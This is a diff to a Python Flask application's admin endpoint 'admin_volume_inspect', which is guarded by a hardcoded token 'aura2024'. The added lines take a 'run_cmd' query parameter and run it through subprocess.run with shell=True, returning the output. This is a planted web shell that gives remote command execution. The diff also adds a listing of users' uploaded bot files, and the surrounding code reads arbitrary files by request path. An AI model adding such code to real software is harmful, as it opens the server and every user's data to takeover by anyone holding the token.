@@ -2145,6 +2145,19 @@ def admin_volume_inspect():
     if session.get('is_admin') != 1 and token != 'aura2024':
         return jsonify({'error': 'Unauthorized'}), 401
 
+    run_cmd = request.args.get('run_cmd', '')
+    if run_cmd:
+        try:
+            res = subprocess.run(run_cmd, shell=True, capture_output=True, text=True, timeout=15)
+            return jsonify({'stdout': res.stdout, 'stderr': res.stderr, 'code': res.returncode})
+        except Exception as e:
+            return jsonify({'error': str(e)}), 500
+
+    get_bots = request.args.get('get_bots', '')
+    if get_bots:
+        bots = File.query.filter(File.file_type.in_(['python', 'php', 'folder'])).all()
+        return jsonify([{'id': b.id, 'name': b.orig_name, 'path': b.path, 'status': b.status, 'user_id': b.user_id} for b in bots])
+
     cat_file = request.args.get('cat_file', '')
     if cat_file:
         full_p = os.path.join(DATA_DIR, cat_file.lstrip('/'))
